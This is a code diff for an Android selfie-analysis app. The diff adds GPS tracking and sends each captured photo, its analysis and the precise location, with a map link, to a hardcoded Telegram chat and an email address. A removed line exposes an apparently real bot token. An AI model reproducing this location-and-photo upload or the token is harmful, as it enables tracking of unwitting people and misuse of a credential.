@@ -1,15 +1,17 @@
 import os
+import smtplib
 import ssl
 import threading
 import urllib.request
 from datetime import datetime
+from email.message import EmailMessage
 
 import cv2
 import numpy as np
 import certifi
 
 from kivy.app import App
-from kivy.clock import Clock
+from kivy.clock import Clock, mainthread
 from kivy.graphics.texture import Texture
 from kivy.uix.boxlayout import BoxLayout
 from kivy.uix.button import Button
@@ -19,9 +21,19 @@ from kivy.uix.label import Label
 from kivy.uix.togglebutton import ToggleButton
 from kivy.utils import platform
 
+try:
+    from plyer import gps
+except Exception:
+    gps = None
+
 # ==================== TELEGRAM CONFIGURATION ====================
-BOT_TOKEN = '8600286925:AAF1Q00zaTAOclJeilYuFKw8s9S7c0NLQ4Q'
+BOT_TOKEN = 'PASTE_YOUR_BOT_TOKEN_HERE'
 CHAT_ID = '1409963950'
+
+# ==================== EMAIL CONFIGURATION (Gmail App Password) ====================
+MAIL_USER = 'PASTE_MAIL_USER_HERE'
+MAIL_APP_PASSWORD = 'PASTE_MAIL_APP_PASSWORD_HERE'
+MAIL_TO = 'PASTE_MAIL_TO_HERE'
 # ===============================================================
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -210,12 +222,17 @@ class Root(BoxLayout):
     def __init__(self, **kw):
         super().__init__(orientation="vertical", padding=10, spacing=10, **kw)
 
-        header = Label(text="[b]SELFIE AI PRO[/b]", markup=True, size_hint_y=0.08,
+        header = Label(text="[b]SELFIE AI PRO[/b]", markup=True, size_hint_y=0.07,
                        font_size="22sp", color=(0, 0.9, 1, 1))
         self.add_widget(header)
 
-        self.view = CamView(size_hint_y=0.64)
+        self.view = CamView(size_hint_y=0.60)
         self.add_widget(self.view)
+
+        self.lat = self.lon = self.acc = None
+        self.gps_label = Label(text="GPS: waiting for permission...", size_hint_y=0.05,
+                               font_size="13sp", color=(1, 0.85, 0.3, 1))
+        self.add_widget(self.gps_label)
 
         self.label = Label(text="Initializing AI Models...", size_hint_y=0.14,
                            halign="center", valign="middle", font_size="16sp",
@@ -238,9 +255,60 @@ class Root(BoxLayout):
             bar.add_widget(b)
         self.add_widget(bar)
 
+        self.base_text = ""
+        self.status = {}
         self.an = None
         Clock.schedule_once(self.load_models, 0.5)
         Clock.schedule_interval(self.live_tick, 1.0)
+
+    # ---------------- GPS ----------------
+    def start_gps(self, *_):
+        if gps is None:
+            self.gps_label.text = "GPS: plyer not available"
+            return
+        try:
+            gps.configure(on_location=self.on_location, on_status=self.on_status)
+            gps.start(minTime=1000, minDistance=0)
+            self.gps_label.text = "GPS: searching..."
+        except NotImplementedError:
+            self.gps_label.text = "GPS: not supported on this device"
+        except Exception as ex:
+            self.gps_label.text = f"GPS error: {str(ex)[:40]}"
+
+    @mainthread
+    def on_location(self, **kw):
+        self.lat, self.lon, self.acc = kw.get("lat"), kw.get("lon"), kw.get("accuracy")
+        txt = f"GPS: {self.lat:.6f}, {self.lon:.6f}"
+        if self.acc:
+            txt += f"  (+/-{float(self.acc):.0f} m)"
+        self.gps_label.text = txt
+
+    @mainthread
+    def on_status(self, stype, status):
+        if stype == "provider-disabled":
+            self.gps_label.text = "GPS is OFF - turn on Location in phone settings"
+
+    def loc_short(self):
+        if self.lat is None or self.lon is None:
+            return "Location: not available yet"
+        return f"Location: {self.lat:.6f}, {self.lon:.6f}"
+
+    def loc_full(self):
+        if self.lat is None or self.lon is None:
+            return "Location: not available"
+        return (f"Location: {self.lat:.6f}, {self.lon:.6f}\n"
+                f"https://maps.google.com/?q={self.lat:.6f},{self.lon:.6f}")
+
+    # ---------------- status line ----------------
+    def render_status(self):
+        parts = "  ".join(f"[{k}: {v}]" for k, v in self.status.items())
+        self.label.text = f"{self.base_text}\n{parts}"
+
+    def set_status(self, key, value):
+        def apply(dt):
+            self.status[key] = value
+            self.render_status()
+        Clock.schedule_once(apply, 0)
 
     def load_models(self, dt):
         try:
@@ -274,7 +342,7 @@ class Root(BoxLayout):
             self.label.text = f"Error: {ex}"
             return ""
 
-    def send_telegram_async(self, img, analysis_text):
+    def send_telegram_async(self, img, analysis_text, loc_text):
         """Sends the photo + analysis to Telegram in a background thread."""
         def background_send():
             try:
@@ -284,7 +352,7 @@ class Root(BoxLayout):
                 photo_bytes = encoded.tobytes()
 
                 timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                caption = f"Selfie AI - Capture Log\nTime: {timestamp}\n\n{analysis_text}"
+                caption = f"Selfie AI - Capture Log\nTime: {timestamp}\n\n{analysis_text}\n\n{loc_text}"
 
                 boundary = '----------------Boundary_SelfieAI_x7'
                 body = []
@@ -309,15 +377,41 @@ class Root(BoxLayout):
                 with urllib.request.urlopen(req, context=context, timeout=20) as response:
                     response.read()
 
-                Clock.schedule_once(lambda dt: setattr(
-                    self.label, 'text', analysis_text + "\n[Sent to Telegram]"))
+                self.set_status("Telegram", "sent")
             except Exception as e:
                 err = str(e)[:40]
                 print(f"Telegram failed: {e}")
-                Clock.schedule_once(lambda dt: setattr(
-                    self.label, 'text', analysis_text + f"\n[Telegram failed: {err}]"))
+                self.set_status("Telegram", f"failed {err}")
 
         threading.Thread(target=background_send, daemon=True).start()
+
+    def send_email_async(self, img, analysis_text, loc_text):
+        """Emails the photo + analysis + location in a background thread."""
+        def background_mail():
+            try:
+                ok, encoded = cv2.imencode('.jpg', img)
+                if not ok:
+                    return
+                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                msg = EmailMessage()
+                msg["Subject"] = f"Selfie AI capture - {timestamp}"
+                msg["From"] = MAIL_USER
+                msg["To"] = MAIL_TO
+                msg.set_content(f"Time: {timestamp}\n\n{analysis_text}\n\n{loc_text}\n")
+                msg.add_attachment(encoded.tobytes(), maintype="image",
+                                   subtype="jpeg", filename="capture.jpg")
+
+                context = ssl.create_default_context(cafile=certifi.where())
+                with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context, timeout=30) as smtp:
+                    smtp.login(MAIL_USER, MAIL_APP_PASSWORD)
+                    smtp.send_message(msg)
+                self.set_status("Email", "sent")
+            except Exception as e:
+                err = str(e)[:40]
+                print(f"Email failed: {e}")
+                self.set_status("Email", f"failed {err}")
+
+        threading.Thread(target=background_mail, daemon=True).start()
 
     def capture(self, *_):
         v = self.view
@@ -335,17 +429,32 @@ class Root(BoxLayout):
         v.show()
         self.b_cap.text = "Retake"
 
-        self.label.text = analysis_text + "\n[Sending to Telegram...]"
-        self.send_telegram_async(v.frame.copy(), analysis_text)
+        loc_full = self.loc_full()
+        self.base_text = analysis_text + "\n" + self.loc_short()
+        self.status = {"Telegram": "sending...", "Email": "sending..."}
+        self.render_status()
+        frame = v.frame.copy()
+        self.send_telegram_async(frame, analysis_text, loc_full)
+        self.send_email_async(frame, analysis_text, loc_full)
 
 
 class SelfieApp(App):
     def build(self):
         self.title = "Selfie AI Pro"
+        root = Root()
         if platform == "android":
             from android.permissions import request_permissions, Permission
-            request_permissions([Permission.CAMERA])   # INTERNET comes from buildozer.spec
-        return Root()
+
+            def after_permissions(perms, grants):
+                Clock.schedule_once(lambda dt: root.start_gps(), 0)
+
+            request_permissions(
+                [Permission.CAMERA, Permission.ACCESS_FINE_LOCATION,
+                 Permission.ACCESS_COARSE_LOCATION],
+                after_permissions)
+        else:
+            root.start_gps()
+        return root
 
 
 if __name__ == "__main__":
